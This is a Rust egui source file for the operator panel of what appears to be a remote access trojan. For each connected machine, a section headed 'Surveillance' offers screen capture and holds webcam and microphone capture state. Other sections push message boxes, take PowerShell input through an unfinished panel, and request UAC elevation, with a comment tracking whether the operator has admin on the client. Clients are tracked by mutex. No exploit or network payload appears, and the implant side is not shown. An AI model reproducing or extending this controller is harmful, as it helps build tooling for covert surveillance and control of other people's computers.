use core::f32;

use crate::manager::types::UiManagerCommand;
use egui::{
    Button, CollapsingHeader, Color32, ColorImage, Context, Frame, Id, Image, Margin, RadioButton,
    RichText, ScrollArea, Stroke, TextEdit, TextStyle, TextureHandle, Ui, Widget, Window,
};
use shared::commands::{
    CaptureCommand, CaptureQuality, CaptureType, Command, ComputerInfoResponse, MessageBoxArgs,
};
use tokio::sync::mpsc::UnboundedSender;

pub struct MsgboxView {
    pub title: String,
    pub text: String,
}
pub struct PowershellView {
    pub input: String,
    pub output: String,
}
impl Default for MsgboxView {
    fn default() -> Self {
        Self {
            title: String::from("Title"),
            text: String::from("Text"),
        }
    }
}

pub struct ClientViewCaptureState {
    pub screen: bool,
    pub webcam: bool,
    pub mic: bool,
}
impl Default for ClientViewCaptureState {
    fn default() -> Self {
        Self {
            screen: false,
            webcam: false,
            mic: false,
        }
    }
}

pub struct ClientViewCapture {
    pub quality: CaptureQuality,
    pub data: Option<ColorImage>,
}
pub struct ClientViewCaptures {
    pub screen: ClientViewCapture,
    pub webcam: ClientViewCapture,
}
pub struct ClientViewTextures {
    pub screen: Option<TextureHandle>,
    pub webcam: Option<TextureHandle>,
}
pub struct ClientViewState {
    pub visible: bool,
    pub powershell: PowershellView,
    pub captures: ClientViewCaptures,
    pub textures: ClientViewTextures,
    pub capturing: ClientViewCaptureState,
    pub msgbox: MsgboxView,
}
pub struct ClientView {
    pub mutex: String,
    pub elevated: bool, // do we have admin on the client
    pub state: ClientViewState,
    pub socket: String,
    pub info: ComputerInfoResponse,
    sender: UnboundedSender<UiManagerCommand>,
}
impl ClientView {
    pub fn new(
        socket: String,
        mutex: String,
        elevated: bool,
        info: ComputerInfoResponse,
        sender: UnboundedSender<UiManagerCommand>,
    ) -> Self {
        Self {
            mutex: mutex,
            elevated: elevated, // assume no
            socket: socket,
            state: ClientViewState {
                visible: false,
                powershell: PowershellView {
                    input: String::new(),
                    output: String::new(),
                },
                captures: ClientViewCaptures {
                    screen: ClientViewCapture {
                        quality: CaptureQuality::Speed,
                        data: None,
                    },
                    webcam: ClientViewCapture {
                        quality: CaptureQuality::Speed,
                        data: None,
                    },
                },
                textures: ClientViewTextures {
                    screen: None,
                    webcam: None,
                },
                capturing: ClientViewCaptureState::default(),
                msgbox: MsgboxView::default(),
            },
            // socket: socket,
            info: info,
            sender: sender,
        }
    }
}

pub fn render(ctx: &Context, view: &mut ClientView) {
    Window::new(view.info.hostname.clone())
        .id(Id::new(&view.mutex)) // rely on the mutex in case connected devices share a hostname (for whatever reason)
        .open(&mut view.state.visible)
        .resizable(true)
        .show(ctx, |ui| {
            CollapsingHeader::new("🔍  Surveillance")
                .default_open(true)
                .show(ui, |ui| {
                    CollapsingHeader::new("🖵  Screen")
                        .default_open(false)
                        .show(ui, |ui| {
                            if let Some(ref image) = view.state.captures.screen.data {
                                if view.state.textures.screen.is_none() {
                                    view.state.textures.screen = Some(ui.ctx().load_texture(
                                        format!("capture_{}", view.mutex.clone()),
                                        image.clone(),
                                        Default::default(),
                                    ));
                                };
                                if let Some(texture) = &view.state.textures.screen {
                                    let available_size = ui.available_size();
                                    let image_size = texture.size_vec2();
                                    let max_width = available_size.x.min(720.0);
                                    let max_height = available_size.y.min(560.0);
                                    let scale_x = max_width / image_size.x;
                                    let scale_y = max_height / image_size.y;
                                    let scale = scale_x.min(scale_y).min(1.0);
                                    let display_size = image_size * scale;
                                    ui.add(Image::new(texture).max_size(display_size));
                                }
                            }

                            if view.state.capturing.screen {
                                if ui.button("⏹  Stop").clicked() {
                                    println!("[*] sending CaptureCommand::Stop");
                                    let _ = view.sender.send(UiManagerCommand::SendCommand(
                                        view.mutex.clone(),
                                        Command::Capture(CaptureCommand::Stop, CaptureType::Screen),
                                    ));
                                    view.state.capturing.screen = false;
                                }
                            } else {
                                if ui.button("▶  Start").clicked() {
                                    println!("[*] sending CaptureCommand::Start");
                                    let _ = view.sender.send(UiManagerCommand::SendCommand(
                                        view.mutex.clone(),
                                        Command::Capture(
                                            CaptureCommand::Start(
                                                view.state.captures.screen.quality.clone(),
                                            ),
                                            CaptureType::Screen,
                                        ),
                                    ));
                                    view.state.capturing.screen = true;
                                };
                            }

                            //////////////////////////////////////
                            // quality toggle
                            ui.add_enabled_ui(!view.state.capturing.screen, |ui| {
                                ui.horizontal(|ui| {
                                    ui.label("Quality: ");
                                    ui.radio_value(
                                        &mut view.state.captures.screen.quality,
                                        CaptureQuality::Quality,
                                        "Slow",
                                    );
                                    ui.radio_value(
                                        &mut view.state.captures.screen.quality,
                                        CaptureQuality::Speed,
                                        "Fast",
                                    );
                                });
                            });
                        });
                });
            CollapsingHeader::new("🗁  Utility")
                .default_open(true)
                .show(ui, |ui| {
                    CollapsingHeader::new("💬  MessageBox")
                        .default_open(false)
                        .show(ui, |ui| {
                            ui.text_edit_singleline(&mut view.state.msgbox.title);
                            ui.text_edit_multiline(&mut view.state.msgbox.text);

                            if ui.button("Send").clicked() {
                                let _ = view.sender.send(UiManagerCommand::SendCommand(
                                    view.mutex.clone(),
                                    Command::MessageBox(MessageBoxArgs {
                                        title: view.state.msgbox.title.clone(),
                                        text: view.state.msgbox.text.clone(),
                                    }),
                                ));
                            }
                        });


                    let theme = egui_extras::syntax_highlighting::CodeTheme::from_memory(ui.ctx(), ui.style());
                    let mut layouter = |ui: &egui::Ui, buf: &dyn egui::TextBuffer, wrap_width: f32| {
                        let mut layout_job = egui_extras::syntax_highlighting::highlight(
                            ui.ctx(),
                            ui.style(),
                            &theme,
                            buf.as_str(),
                            "ps1", // syntect doesnt have built in support for ps1
                        );
                        layout_job.wrap.max_width = wrap_width;
                        ui.fonts(|f| f.layout_job(layout_job))
                    };
                    CollapsingHeader::new("🗖  PowerShell").default_open(false)
                    .show(ui, |ui| {
                        ui.label("Input");
                        ScrollArea::vertical().show(ui, |ui| {
                            ui.add(TextEdit::multiline(&mut view.state.powershell.input)
                        .font(TextStyle::Monospace)
                        .code_editor()
                        .desired_rows(8)
                        .lock_focus(true)
                        .desired_width(f32::INFINITY)
                        .layouter(&mut layouter))
                        });
                        ui.label("Output");
                        ScrollArea::vertical().show(ui, |ui| {
                            ui.label(
                                RichText::new(&view.state.powershell.output)
                                    .monospace()
                                    .size(12.0)
                                    .color(ui.visuals().text_color())
                                    .text_style(TextStyle::Monospace),
                            )
                        });
                        if ui.button("Send").clicked() {};
                    });
                    CollapsingHeader::new("🛡  Elevate")
                        .default_open(false)
                        .show(ui, |ui| {
                            if !view.elevated {
                                ui.label("If UAC is enabled on the client, clicking this button will prompt the user, and requires administrative privileges.");
                            } else {
                                ui.label("✔ Already elevated");
                            }
                            if ui.add_enabled(!view.elevated, Button::new("Send")).clicked() {
                                let _ = view.sender.send(UiManagerCommand::SendCommand(view.mutex.clone(), Command::Elevate));
                            };
                        });

                });

            let disconnect = eframe::egui::Button::new("✖  Disconnect")
                .fill(Color32::DARK_RED)
                .stroke(Stroke::new(1.0, Color32::BLACK));
            Frame::new().inner_margin(Margin::same(4)).show(ui, |ui| {
                if ui.add(disconnect).clicked() {
                    let _ = view
                        .sender
                        .send(UiManagerCommand::Disconnect(view.mutex.clone()));
                }
            })
        });
}
